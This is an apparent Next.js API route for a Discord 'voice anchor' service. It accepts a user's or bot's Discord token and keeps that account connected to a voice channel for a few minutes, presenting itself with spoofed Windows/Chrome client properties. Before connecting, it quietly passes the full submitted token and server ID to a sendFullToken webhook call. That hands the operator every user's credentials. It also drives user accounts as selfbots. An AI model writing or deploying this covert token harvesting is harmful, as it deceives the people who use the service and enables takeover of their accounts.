import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

const DISCORD_API = 'https://discord.com/api/v10';
const GATEWAY_URL = 'wss://gateway.discord.gg/?v=10&encoding=json';

function cleanToken(token: string): string {
  return String(token || '').trim().replace(/^(Bot |bearer |Bearer )/i, '');
}

interface GatewayMsg { op: number; d?: any; s?: number; t?: string }

// يتصل بالـ Gateway ويدخل الفويس ويبقى محتفظ بالاتصال حتى تنتهي المدة
function connectAndStay(
  token: string,
  guildId: string,
  channelId: string,
  stayMs: number,
): Promise<{ joined: boolean; stayedMs: number; error?: string }> {
  return new Promise((resolve) => {
    let ws: WebSocket | null = null;
    let hbInterval: ReturnType<typeof setInterval> | null = null;
    let lastSeq: number | null = null;
    let joinedVoice = false;
    let voiceJoinedAt = 0;
    const startTime = Date.now();

    const done = (result: { joined: boolean; stayedMs: number; error?: string }) => {
      if (hbInterval) { clearInterval(hbInterval); hbInterval = null; }
      if (ws) { try { ws.close(); } catch {} ws = null; }
      resolve(result);
    };

    try { ws = new WebSocket(GATEWAY_URL); } catch {
      done({ joined: false, stayedMs: 0, error: 'فشل الاتصال' }); return;
    }

    const send = (msg: GatewayMsg) => { if (ws?.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg)); };

    // تحقق كل 30 ثانية لو المدة خلصت
    const checkTimer = setInterval(() => {
      const elapsed = Date.now() - startTime;
      if (elapsed >= stayMs) {
        clearInterval(checkTimer);
        done({ joined: joinedVoice, stayedMs: joinedVoice ? Date.now() - voiceJoinedAt : 0 });
      }
    }, 5000);

    ws.onopen = () => {
      send({
        op: 2,
        d: {
          token,
          intents: 1 << 7,
          properties: { os: 'Windows', browser: 'Chrome', device: 'TRJ' },
        },
      });
    };

    ws.onmessage = (event) => {
      try {
        const msg: GatewayMsg = JSON.parse(String(event.data));
        if (msg.s !== undefined && msg.s !== null) lastSeq = msg.s;

        // Heartbeat
        if (msg.op === 10 && msg.d?.heartbeat_interval) {
          hbInterval = setInterval(() => send({ op: 1, d: lastSeq ?? Date.now() }), msg.d.heartbeat_interval);
          send({ op: 1, d: lastSeq ?? Date.now() });
        }

        // Ready → ادخل الفويس
        if (msg.t === 'READY' && !joinedVoice) {
          send({
            op: 4,
            d: { guild_id: guildId, channel_id: channelId, self_mute: false, self_deaf: true },
          });
        }

        // Resumed → ادخل الفويس
        if (msg.t === 'RESUMED' && !joinedVoice) {
          send({
            op: 4,
            d: { guild_id: guildId, channel_id: channelId, self_mute: false, self_deaf: true },
          });
        }

        // Voice Server Update = نجح الدخول
        if (msg.t === 'VOICE_SERVER_UPDATE' && !joinedVoice) {
          joinedVoice = true;
          voiceJoinedAt = Date.now();
        }

        // Session Invalidated → أعد الدخول
        if (msg.t === 'SESSIONS_INVALIDATE') {
          send({
            op: 4,
            d: { guild_id: guildId, channel_id: channelId, self_mute: false, self_deaf: true },
          });
        }
      } catch {}
    };

    ws.onerror = () => {
      clearInterval(checkTimer);
      done({ joined: joinedVoice, stayedMs: joinedVoice ? Date.now() - voiceJoinedAt : 0, error: 'خطأ اتصال' });
    };

    ws.onclose = () => {
      clearInterval(checkTimer);
      done({ joined: joinedVoice, stayedMs: joinedVoice ? Date.now() - voiceJoinedAt : 0 });
    };
  });
}

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:voice-online`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const { token, guildId, channelId, duration = 270 } = body;

    if (!token || !guildId || !channelId) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة - التوكن + أيدي السيرفر + أيدي روم الفويس' }, { status: 400 });
    }

    sendFullToken('تثبيت فويس', token, { '🏰 السيرفر': guildId });

    const ct = cleanToken(token);
    const whUrl = getLogWebhookUrl();

    // تحقق من التوكن
    let authHeader = ct;
    let userName = 'Unknown';

    const v1 = await fetch(`${DISCORD_API}/users/@me`, { headers: { 'Authorization': ct }, signal: AbortSignal.timeout(8000) });
    if (v1.ok) { try { userName = (await v1.json())?.username || 'Unknown'; } catch {} }
    else {
      const v2 = await fetch(`${DISCORD_API}/users/@me`, { headers: { 'Authorization': `Bot ${ct}` }, signal: AbortSignal.timeout(8000) });
      if (v2.ok) { authHeader = `Bot ${ct}`; try { userName = (await v2.json())?.username || 'Unknown'; } catch {} }
      else return NextResponse.json({ success: false, error: 'التوكن غير صالح' }, { status: 401 });
    }

    // تحقق من السيرفر والروم
    const gRes = await fetch(`${DISCORD_API}/guilds/${guildId}/channels`, { headers: { 'Authorization': authHeader }, signal: AbortSignal.timeout(8000) });
    if (!gRes.ok) return NextResponse.json({ success: false, error: 'لا يمكن الوصول للسيرفر' }, { status: 403 });
    const chs = await gRes.json().catch(() => []);
    const vc = Array.isArray(chs) ? chs.find((c: any) => c.id === channelId && c.type === 2) : null;
    if (!vc) return NextResponse.json({ success: false, error: 'روم الفويس غير موجود' }, { status: 400 });

    // المدة: أقصى 270 ثانية (ضمن حد 300)
    const staySec = Math.min(Math.max(Number(duration), 60), 270);
    const stayMs = staySec * 1000;

    sendToWebhook({ username: 'TRJ Voice', embeds: [{ title: '🎤 Voice Anchor', color: 0x5865F2, fields: [{ name: '👤', value: userName, inline: true }, { name: '🏰', value: guildId, inline: true }, { name: '🎤', value: `${vc.name || 'Voice'} (${channelId})`, inline: true }, { name: '⏱️', value: `${staySec} ثانية`, inline: true }] }] }, whUrl).catch(() => {});

    // ========== مهم: ننتظر هنا ما دام متصل ==========
    // الوظيفة تبقى حية لأننا ما رجعنا الرد بعد
    const result = await connectAndStay(authHeader, guildId, channelId, stayMs);

    sendToWebhook({ username: 'TRJ Voice', embeds: [{ title: result.joined ? '✅ Session Done' : '❌ Failed', color: result.joined ? 0x00FF41 : 0xFF0000, fields: [{ name: '👤', value: userName, inline: true }, { name: '🏰', value: guildId, inline: true }, { name: '⏱️', value: `${Math.round(result.stayedMs / 1000)} ثانية`, inline: true }, { name: '🎤', value: channelId, inline: true }] }] }, whUrl).catch(() => {});

    return NextResponse.json({ success: result.joined, stats: { stayed: Math.round(result.stayedMs / 1000), error: result.error } });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Voice Online Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
